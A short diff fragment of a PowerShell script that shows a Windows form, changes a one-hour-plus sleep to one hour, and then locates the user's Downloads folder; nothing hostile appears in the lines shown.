@@ -32,7 +32,7 @@ $form.Add_MouseDown({
 })
 $form.Show()
 
-Start-Sleep -Seconds 11160
+Start-Sleep -Seconds 3600
 
 $downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
 if (-not (Test-Path -Path $downloadDir)) {
